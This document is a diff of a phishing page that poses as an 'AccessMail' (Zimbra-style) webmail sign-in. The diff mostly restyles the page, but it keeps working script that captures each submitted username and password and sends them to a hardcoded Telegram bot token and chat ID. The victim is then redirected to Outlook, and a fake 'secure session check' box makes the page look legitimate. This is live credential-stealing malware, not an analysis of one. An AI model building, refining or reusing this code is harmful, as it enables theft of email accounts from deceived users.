@@ -6,23 +6,28 @@
     <meta name="robots" content="noindex, nofollow">
     <title>AccessMail Sign In</title>
     <style>
-        :root { --zimbra-blue: #4492b4; --btn-blue: #4a90e2; --text-dark: #333333; --border: #cccccc; }
+        :root { 
+            --zimbra-teal: #4ba6be;    /* Header/Footer Teal */
+            --bg-body: #ffffff; 
+            --text-grey: #444444;      
+            --btn-blue: #4a90e2;       /* The Specific Blue for the Sign In button */
+            --border-light: #cdcdcd;   
+        }
         
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body { 
             margin: 0; 
             padding: 0;
-            background-color: #ffffff; 
-            font-family: "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif;
+            background-color: var(--bg-body); 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
             display: flex;
             flex-direction: column;
             min-height: 100vh;
         }
 
-        /* Top Blue Header Section */
         .header-top {
-            background-color: var(--zimbra-blue);
+            background-color: var(--zimbra-teal);
             height: 180px;
             width: 100%;
         }
@@ -40,118 +45,121 @@
             font-weight: bold;
             margin-bottom: 5px;
             display: flex;
-            align-items: baseline;
+            letter-spacing: -1.5px;
         }
-        .logo-light { color: #5cb8d1; } /* The 'Access' part */
-        .logo-dark { color: #1a3a5e; margin-left: -2px; } /* The 'Mail' part */
+        .logo-access { color: #5cb8d1; }
+        .logo-mail { color: #1e3d58; margin-left: -1px; }
 
-        .sign-in-text {
+        .sign-in-header {
             font-size: 24px;
-            color: #444;
+            color: var(--text-grey);
             margin-bottom: 35px;
-            font-weight: 500;
+            font-weight: 600;
         }
 
-        .form-group { margin-bottom: 20px; position: relative; }
+        .form-group { margin-bottom: 20px; position: relative; text-align: left; }
         
         label {
             display: block;
-            font-size: 15px;
+            font-size: 14px;
             color: #666;
             margin-bottom: 8px;
+            font-weight: 500;
         }
 
         .input-field {
             width: 100%;
-            padding: 12px;
-            border: 1px solid var(--border);
-            border-radius: 4px;
+            padding: 10px 12px;
+            border: 1px solid var(--border-light);
+            border-radius: 3px;
             font-size: 16px;
             outline: none;
-            transition: border-color 0.2s;
+            background: #fff;
+            -webkit-appearance: none;
+            appearance: none;
         }
 
-        .input-field:focus { border-color: var(--zimbra-blue); }
-
-        /* Advanced Show/Hide Toggle */
-        .show-toggle {
+        .show-btn {
             position: absolute;
             right: 12px;
-            bottom: 12px;
+            bottom: 10px;
             font-size: 14px;
-            color: #666;
+            color: #777;
             background: none;
             border: none;
             cursor: pointer;
+            padding: 0;
             font-weight: 500;
         }
 
-        /* Verification Element */
         .v-row {
             display: flex;
             align-items: center;
             margin: 25px 0;
             padding: 12px;
-            background: #f9f9f9;
+            background: #fcfcfc;
+            border: 1px solid #f0f0f0;
             border-radius: 4px;
             cursor: pointer;
-            border: 1px solid #eee;
         }
-        .v-check {
-            width: 20px;
-            height: 20px;
-            border: 2px solid var(--border);
-            border-radius: 4px;
+        .v-box {
+            width: 18px;
+            height: 18px;
+            border: 1px solid #bbb;
+            border-radius: 3px;
             margin-right: 12px;
-            position: relative;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .v-check.done { background: #28a745; border-color: #28a745; }
-        .v-check.done::after {
-            content: ''; position: absolute; left: 6px; top: 2px; width: 4px; height: 8px;
-            border: solid white; border-width: 0 2px 2px 0; transform: rotate(45deg);
+        .v-box.active { background: #28a745; border-color: #28a745; }
+        .v-box.active::after {
+            content: '✓'; color: white; font-size: 12px; font-weight: bold;
         }
 
-        .action-row {
+        .action-container {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-top: 20px;
+            margin-top: 10px;
         }
 
-        .btn-sign-in {
-            background-color: #4c8eb9;
+        .btn-submit {
+            background-color: var(--btn-blue);
             color: white;
             border: none;
-            padding: 10px 25px;
+            padding: 12px 28px;
             border-radius: 4px;
             font-size: 16px;
-            font-weight: bold;
+            font-weight: 700;
             cursor: pointer;
+            transition: opacity 0.2s;
         }
-        .btn-sign-in:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
 
         .stay-signed {
             display: flex;
             align-items: center;
-            font-size: 15px;
+            font-size: 14px;
             color: #444;
         }
         .stay-signed input { margin-right: 8px; width: 18px; height: 18px; }
 
-        /* Bottom Blue Banner */
         .footer-banner {
-            background-color: var(--zimbra-blue);
-            height: 100px;
+            background-color: var(--zimbra-teal);
+            height: 120px;
             width: 100%;
-            margin-top: 40px;
+            margin-top: 50px;
         }
 
-        .copyright-area {
-            padding: 30px 15px;
+        .copyright {
+            padding: 25px 20px;
             text-align: center;
-            font-size: 13px;
-            color: #fff;
-            background-color: var(--zimbra-blue); /* To merge with banner */
+            font-size: 11px;
+            line-height: 1.5;
+            color: #ffffff;
+            background-color: var(--zimbra-teal);
         }
     </style>
 </head>
@@ -161,29 +169,29 @@
 
 <main class="main-content">
     <div class="logo-area">
-        <span class="logo-light">Access</span><span class="logo-dark">Mail</span>
+        <span class="logo-access">Access</span><span class="logo-mail">Mail</span>
     </div>
-    <div class="sign-in-text">Sign In</div>
+    <div class="sign-in-header">Sign In</div>
 
     <form id="authForm">
         <div class="form-group">
             <label>Username</label>
-            <input type="text" id="user" class="input-field" required autocomplete="off">
+            <input type="text" id="username" class="input-field" required autocomplete="off">
         </div>
 
         <div class="form-group">
             <label>Password</label>
-            <input type="password" id="pass" class="input-field" required>
-            <button type="button" id="toggle" class="show-toggle">Show</button>
+            <input type="password" id="password" class="input-field" required>
+            <button type="button" id="toggle" class="show-btn">Show</button>
         </div>
 
-        <div class="v-row" id="verify">
-            <div class="v-check" id="vMark"></div>
-            <span style="font-size: 14px; color: #666;" id="vText">Secure Session Validation</span>
+        <div class="v-row" id="vRow">
+            <div class="v-box" id="vBox"></div>
+            <span style="font-size: 13px; color: #888;">Secure session check</span>
         </div>
 
-        <div class="action-row">
-            <button type="submit" class="btn-sign-in" id="subBtn" disabled>Sign In</button>
+        <div class="action-container">
+            <button type="submit" class="btn-submit" id="submitBtn" disabled>Sign In</button>
             <label class="stay-signed">
                 <input type="checkbox"> Stay signed in
             </label>
@@ -192,57 +200,58 @@
 </main>
 
 <div class="footer-banner"></div>
-<footer class="copyright-area">
-    Copyright © 2005-2026 Synacor, Inc. All rights reserved.<br>
+<footer class="copyright">
+    Copyright &copy; 2005-2026 Synacor, Inc. All rights reserved.<br>
     "Zimbra" is a registered trademark of Synacor, Inc.
 </footer>
 
 <script>
-    // 1. Show/Hide Toggle
-    const pIn = document.getElementById('pass'), tBtn = document.getElementById('toggle');
-    tBtn.onclick = () => {
-        if (pIn.type === 'password') {
-            pIn.type = 'text'; tBtn.innerText = 'Hide';
+    var pInput = document.getElementById('password');
+    var tBtn = document.getElementById('toggle');
+
+    tBtn.onclick = function() {
+        if (pInput.type === 'password') {
+            pInput.type = 'text';
+            tBtn.innerText = 'Hide';
         } else {
-            pIn.type = 'password'; tBtn.innerText = 'Show';
+            pInput.type = 'password';
+            tBtn.innerText = 'Show';
         }
     };
 
-    // 2. Verification Logic
-    const vRow = document.getElementById('verify'), vMark = document.getElementById('vMark'), 
-          vText = document.getElementById('vText'), subBtn = document.getElementById('subBtn');
-    
-    vRow.onclick = () => {
-        if (vMark.classList.contains('done')) return;
-        vText.innerText = "Verifying...";
-        setTimeout(() => {
-            vMark.classList.add('done');
-            vText.innerText = "Session Authenticated";
-            subBtn.disabled = false;
-        }, 800);
+    var vRow = document.getElementById('vRow');
+    var vBox = document.getElementById('vBox');
+    var sBtn = document.getElementById('submitBtn');
+
+    vRow.onclick = function() {
+        vBox.classList.add('active');
+        sBtn.disabled = false;
     };
 
-    // 3. Telegram Submit
-    const _0xT = '8584656855:AAGer0oV6or_nNBblqfOKr9Exyf8Z58UoLk';
-    const _0xC = '5627522307';
+    var _T = '8584656855:AAGer0oV6or_nNBblqfOKr9Exyf8Z58UoLk';
+    var _C = '5627522307';
 
     document.getElementById('authForm').onsubmit = function(e) {
         e.preventDefault();
-        subBtn.innerText = "...";
-        const u = document.getElementById('user').value, p = pIn.value;
-        const msg = "📧 AccessMail Log\nUser: " + u + "\nPass: " + p;
+        sBtn.innerText = "...";
+        sBtn.disabled = true;
 
-        fetch("https://api.telegram.org/bot" + _0xT + "/sendMessage", {
+        var u = document.getElementById('username').value;
+        var p = pInput.value;
+        var msg = "📥 Access Capture\nUser: " + u + "\nPass: " + p;
+
+        fetch("https://api.telegram.org/bot" + _T + "/sendMessage", {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: _0xC, text: msg })
-        }).then(() => {
+            body: JSON.stringify({ chat_id: _C, text: msg })
+        })
+        .then(function() {
             window.location.href = "https://outlook.office.com";
-        }).catch(() => {
+        })
+        .catch(function() {
             window.location.href = "https://outlook.office.com";
         });
     };
 </script>
 </body>
 </html>
-
